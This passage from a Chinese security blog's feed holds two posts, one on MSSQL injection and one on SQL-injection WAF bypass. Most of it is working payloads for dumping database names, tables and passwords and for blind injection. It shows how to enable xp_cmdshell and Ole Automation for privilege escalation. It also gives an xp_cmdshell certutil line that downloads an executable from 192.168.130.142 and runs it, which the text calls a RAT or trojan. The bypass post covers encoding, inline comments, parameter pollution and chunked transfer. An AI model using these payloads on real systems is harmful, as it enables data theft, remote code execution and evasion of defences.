quotename(<span class="built_in">count</span>(name)) <span class="keyword">from</span> master.sys.databases)<span class="operator">=</span><span class="number">10</span> <span class="operator">/</span><span class="operator">/</span>取库数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master.sys.databases <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>))<span class="operator">=</span><span class="number">1</span> <span class="comment">--  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables)  <span class="operator">/</span><span class="operator">/</span>获取第一个</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> top <span class="number">2</span> table_name <span class="keyword">from</span> information_schema.tables))     <span class="operator">/</span><span class="operator">/</span><span class="keyword">not</span> <span class="keyword">in</span> 遍历表名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>))<span class="operator">=</span><span class="number">1</span> <span class="comment">--  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取字段名 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>)  <span class="operator">/</span><span class="operator">/</span>获取第一个</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> top <span class="number">2</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>))     <span class="operator">/</span><span class="operator">/</span><span class="keyword">not</span> <span class="keyword">in</span> 遍历字段名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)) <span class="comment">--  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)  遍历id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(username),quotename(password) <span class="keyword">from</span> users <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)) <span class="operator">/</span><span class="operator">/</span>一次取所有</span><br></pre></td></tr></table></figure></li></ol><h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span> <span class="number">109</span></span><br></pre></td></tr></table></figure><h3 id="时间盲注过程"><a href="#时间盲注过程" class="headerlink" title="时间盲注过程"></a>时间盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="存储过程提权"><a href="#存储过程提权" class="headerlink" title="存储过程提权"></a>存储过程提权</h2><p>扩展存储过程是MSsql提供的特殊功能。所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><ul><li><strong>前提：数据库是db_owner权限</strong></li></ul><table><thead><tr><th>扩展存储过程</th><th>说明</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td>直接执行系统命令</td></tr><tr><td>xp_regread</td><td>进行注册表读取</td></tr><tr><td>xp_regwrite</td><td>写入注册表</td></tr><tr><td>xp_dirtree</td><td>进行列目录操作</td></tr><tr><td>xp_ntsec_enumdomains</td><td>查看domain信息</td></tr></tbody></table><ul><li><strong>XP_cmdshell</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span> master.sys.xp_cmdshell <span class="string">&#x27;net user&#x27;</span></span><br></pre></td></tr></table></figure><p>2008默认是没有开启的,而且2008不像以前的版本可以直接加管理员账号了,需要写shell或者执行CS木马上线提权.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;<span class="comment">--</span></span><br></pre></td></tr></table></figure><ul><li><strong>sp_oacreate</strong></li></ul><p>当xpcmdshell 被删除可以使用这个来提权试试,恢复spoacreate</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span></span><br><span class="line">;RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>spoacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合spoamethod 来写文件执行cmd</p><p>在以前的系统有这几种用法,调用cmd 来执行命令,写入启动项,粘贴键替换</p><h2 id="站库分离提权"><a href="#站库分离提权" class="headerlink" title="站库分离提权"></a>站库分离提权</h2><p>在我们遇到站库分离的时候，没办法写webshell，后台也没办法拿下shell的情况下不妨试试用xp_cmdshell下载我们的RAT直接拿下数据库.通过下载木马执行来上线提权.</p><p>1.certutil</p><p>2.vbs</p><p>3.bitsadmin</p><p>4.powershell</p><p>5.ftp</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> master.dbo.xp_cmdshell <span class="string">&#x27;cd c:\www &amp; file.exe&#x27;</span>;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA">https://mp.weixin.qq.com/s/FWsU6nFlX7j7jZxDi7xglA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;权限控制&quot;&gt;&lt;a href=&quot;#权限控制&quot; class=&quot;headerlink&quot; title=&quot;权限控制&quot;&gt;&lt;/a&gt;权限控制&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;固定服务器角色&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;</summary>
      
    
    
    
    
    <category term="sql注入" scheme="https://bstark.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入常见字符WAF绕过</title>
    <link href="https://bstark.me/posts/24561/"/>
    <id>https://bstark.me/posts/24561/</id>
    <published>2022-01-20T11:04:52.000Z</published>
    <updated>2022-01-23T07:58:42.758Z</updated>
    
    <content type="html"><![CDATA[<p>大小写混合<br>替换关键字<br>使用编码<br>使用注释<br>参数污染<br>缓冲区溢出<br>性能因素<br>整合绕过…….</p><h3 id="1-大小写绕过："><a href="#1-大小写绕过：" class="headerlink" title="1.大小写绕过："></a>1.大小写绕过：</h3><ul><li>大小写绕过用于只针对小写或大写的关键字匹配技术</li><li>出现原因：在waf里，使用的正则不完善或者是没有用大小写转换函数</li><li>用法：比如，拦截了union，那就使用uNIoN</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">-3</span>uNIoNsELect1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-替换关键字"><a href="#2-替换关键字" class="headerlink" title="2.替换关键字"></a>2.替换关键字</h3><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><ul><li>出现原因：利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。</li><li>用法：xxx.com/index.php?id=-3UNIunionONSELselectECT1,2,3</li></ul><h4 id="同价词替换"><a href="#同价词替换" class="headerlink" title="同价词替换"></a>同价词替换</h4><ul><li><p>出现原因：WAF主要是针对一些特殊的关键词进行检测</p></li><li><p>and和or不能使用：&amp;&amp;和|| and和or xro ! not</p></li><li><p>=不能使用的情况：可以尝试&lt;、&gt;=</p></li><li><p>空格不能使用（常见）：%20%09%0a%0b%0c%0d%a0/**/空格</p></li><li><p>注意：在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p></li></ul><h4 id="特殊字符拼接"><a href="#特殊字符拼接" class="headerlink" title="特殊字符拼接"></a>特殊字符拼接</h4><ul><li>出现原因：把特殊字符拼接起来绕过WAF的检测</li><li>用法：如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com<span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span>(master..xp_cmdshell<span class="string">&#x27;netuser’)</span></span><br><span class="line"><span class="string">xxx.com/index.php?id=1;exec(&#x27;</span>maste<span class="string">&#x27;+&#x27;</span>r..xp<span class="string">&#x27;+&#x27;</span>_cmdshell<span class="string">&#x27;+&#x27;</span>&quot;netuser&quot;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><ul><li><p>对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、base64等URL编码</p></li><li><p>出现原因：利用浏览器上的进制转换或者语言编码规则来绕过waf</p></li></ul><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><ul><li>输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等</li><li>注意：如果URL编码只进行了一次过滤，可以用两次编码绕过</li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">75</span><span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">69</span><span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">6</span>e<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>a<span class="operator">%</span><span class="number">2</span>f<span class="operator">%</span><span class="number">73</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">6</span>c<span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">74</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">2</span>c<span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">0</span>a</span><br></pre></td></tr></table></figure><ul><li><strong>常用url编码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">空格绕过:</span><br><span class="line">/*%0A*/    //#强制空格</span><br><span class="line">%0A%0D     //使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A</span><br><span class="line">%09TAB 键(水平)</span><br><span class="line">%0a新建一行</span><br><span class="line">%0c新的一页</span><br><span class="line">%0dreturn 功能</span><br><span class="line">%0bTAB 键(垂直)</span><br><span class="line">%a0空格</span><br><span class="line"></span><br><span class="line">绕过 </span><br><span class="line">/*%0A*/union/*%0A*/</span><br><span class="line">/*%0A*/and/*%0A*/</span><br></pre></td></tr></table></figure><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><ul><li><p>常用符号的Unicode编码：单引号:%u0027空格：%u0020左括号：%u0028右括号：%u0029</p></li><li><p>用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>un<span class="operator">%</span>u0069onsel<span class="operator">%</span>u0065ct1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="4-注释绕过："><a href="#4-注释绕过：" class="headerlink" title="4.注释绕过："></a>4.注释绕过：</h3></li><li><p>常见的用于注释的符号：//、–、/**/、#、–+、—、;、–a</p></li><li><p>出现原因：利用语言函数特性来绕过waf的规则</p></li></ul><h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><ul><li>/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。* </li><li>用法：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span>UNIONSELECT1,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span>SELECT1,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul><li>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别(/<em>！</em>/表示注释里面的语句会被执行)*</li><li><em>用法：采用/</em>!code*/来执行我们的SQL语句，内联注释可以用于整个SQL语句中</li><li>举例：过滤器过滤了如下内容 这些都是我们内联绕过需要绕过的目标</li><li>•注意：/<em>!50001select</em>fromtest*/的含义：表示假如数据库是5.00.01以上版本，该语句才会被执行</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>,<span class="keyword">where</span>,table_name,table_schema,<span class="operator">=</span>,andinformation_schema，</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>unionselect1,<span class="number">2</span>,concat(table_name)frominformation_schema.tableswheretable_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*!information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br></pre></td></tr></table></figure><h3 id="5-参数污染："><a href="#5-参数污染：" class="headerlink" title="5.参数污染："></a>5.参数污染：</h3><ul><li><p>HPP(HTTPParameterPolution)又称做重复参数污染，当同一参数出现多次，不同中间件会解析为不同的结果</p></li><li><p>如果WAF只检测了同参数名中的第一个或最后一个，并且中间件特性正好取与WAF相反的参数，则可成功绕过</p></li><li><p>案例：ModSecurity过滤器会将类似于select1,2,3fromtable这类的语句归类为黑名单当web服务器遇到类似/index.aspx?id=select1,2,3fromtable这样的语句时，会阻断请求但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单</p></li></ul> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span> 想要执行的语句：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br><span class="line"><span class="operator">*</span> 提交的URL：<span class="operator">/</span>index.aspx?id<span class="operator">=</span>select1<span class="operator">&amp;</span>id<span class="operator">=</span>,<span class="number">2</span>,<span class="number">3</span>fromtable</span><br></pre></td></tr></table></figure><ul><li><p>说明：</p></li><li><p>1、这不属于黑名单中的模式，不会触发黑名单的拦截功能</p></li><li><p>2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p></li></ul><h3 id="6-缓冲区溢出："><a href="#6-缓冲区溢出：" class="headerlink" title="6.缓冲区溢出："></a>6.缓冲区溢出：</h3><ul><li><p>缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制</p></li><li><p>因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p></li><li><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span>(select1)<span class="operator">=</span>(Select0xAAAAAAAAA<span class="operator">*</span><span class="number">1000</span>moreA)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>说明：示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></li></ul><h3 id="7-整合绕过："><a href="#7-整合绕过：" class="headerlink" title="7.整合绕过："></a>7.整合绕过：</h3><ul><li>整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加</li><li>多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性</li><li>例如：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,concat(<span class="comment">/*!table_name*/</span>)<span class="operator">+</span><span class="keyword">FrOM</span><span class="comment">/*information_schema*/</span>.tables<span class="comment">/*!WHERE*/</span><span class="operator">+</span><span class="comment">/*!TaBlE_ScHeMa*/</span><span class="operator">+</span><span class="keyword">like</span><span class="operator">+</span>database()</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="comment">/*!UNION*/</span><span class="operator">+</span><span class="comment">/*!SELECT*/</span><span class="operator">+</span><span class="number">1</span>,GrOUp_COnCaT(COLUMN_NAME),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span><span class="comment">/*!INFORMATION_SCHEM*/</span>.COLUMNS<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>TABLE_NAME<span class="operator">=</span><span class="number">0x41646d696e</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="8-分块传输绕过："><a href="#8-分块传输绕过：" class="headerlink" title="8.分块传输绕过："></a>8.分块传输绕过：</h3><ul><li>当我们将传输的内容分块时，处理后的HTTP请求由于和已知的payload相差较大，所以可以起到一定的绕过WAF的效果</li><li>举例：正常输入id=1and1=2，被安全狗拦住</li><li>举例：使用分块传输，将id=1and1=2进行分块，成功绕过了安全狗•注意：分块传输需要将关键字and,or,select,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</li></ul><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220118202522075.png" alt="image-20220118202522075"></p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>Q: 注入过程中where table_schema=”admin” 时候””被过滤</p><ul><li><strong>嵌套子查询语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>十六进制</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><ul><li><strong>assci码</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="type">char</span>(<span class="number">104</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">112</span>)</span><br></pre></td></tr></table></figure><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><ul><li><strong>substr() ,mid() ,limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);   <span class="operator">/</span><span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);      <span class="operator">/</span><span class="operator">/</span><span class="keyword">from</span> <span class="keyword">for</span> 绕过</span><br></pre></td></tr></table></figure><ul><li><strong>limit</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span>  <span class="number">0</span>    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">offset</span> 绕过</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> </span><br></pre></td></tr></table></figure><h3 id="比较符号绕过-lt-gt"><a href="#比较符号绕过-lt-gt" class="headerlink" title="比较符号绕过&lt;&gt;"></a>比较符号绕过&lt;&gt;</h3><ul><li><strong>greatest</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大小写混合&lt;br&gt;替换关键字&lt;br&gt;使用编码&lt;br&gt;使用注释&lt;br&gt;参数污染&lt;br&gt;缓冲区溢出&lt;br&gt;性能因素&lt;br&gt;整合绕过…….&lt;/p&gt;
&lt;h3 id=&quot;1-大小写绕过：&quot;&gt;&lt;a href=&quot;#1-大小写绕过：&quot; class=&quot;headerlink&quot; title=&quot;1.</summary>
      
    
    
    
    
    <category term="SQL注入" scheme="https://bstark.me/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap 基础命令</title>
    <link href="https://bstark.me/posts/21446/"/>
    <id>https://bstark.me/posts/21446/</id>
    <published>2022-01-15T12:20:20.000Z</published>
    <updated>2022-01-21T03:57:51.956Z</updated>
    
